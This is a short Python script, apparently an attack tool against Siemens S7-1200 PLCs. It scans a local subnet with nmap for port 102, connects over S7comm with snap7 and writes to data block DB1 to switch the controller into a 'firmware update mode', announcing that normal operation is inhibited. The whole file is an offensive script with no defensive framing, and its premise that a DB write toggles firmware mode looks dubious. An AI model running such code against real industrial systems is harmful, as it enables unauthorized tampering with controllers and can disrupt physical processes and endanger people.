import os
import re
import time
import struct
import snap7
from snap7.util import set_bool
from snap7.client import Client

# -------------------------------------
# Step 1: Find Siemens PLC on the network
# -------------------------------------

def find_plc_ip():
    print("[+] Scanning network for Siemens S7-1200 PLC...")

    # Use nmap to scan for Siemens PLCs (port 102 is used for S7comm)
    scan_result = os.popen("nmap -p 102 --open 192.168.1.0/24").read()

    # Extract IP addresses of devices that have port 102 open
    plc_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', scan_result)

    if plc_ips:
        print(f"[+] Found PLC at IP: {plc_ips[0]}")
        return plc_ips[0]
    else:
        print("[-] No PLC found on the network")
        return None

# -------------------------------------
# Step 2: Connect to PLC & Activate Firmware Update Mode
# -------------------------------------

def activate_firmware_update(plc_ip):
    print(f"[+] Attempting to connect to PLC at {plc_ip}...")

    plc = Client()
    try:
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200

        if plc.get_connected():
            print("[+] Connected to PLC")

            # Simulate enabling firmware update mode (writing specific mode registers)
            db_number = 1  # Assume firmware mode flag is stored in DB1 (this depends on the system).
            start_byte = 0  # Change start address if necessary
            value = struct.pack(">B", 0x01)  # Example command to enable update mode

            plc.db_write(db_number, start_byte, value)
            print("[+] Firmware update mode activated!")
            print("[!] PLC normal operation is now inhibited.")

        else:
            print("[-] Failed to connect to PLC.")
    
    except Exception as e:
        print(f"[-] Error: {e}")

    finally:
        plc.disconnect()

# -------------------------------------
# Main Execution
# -------------------------------------

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        activate_firmware_update(plc_ip)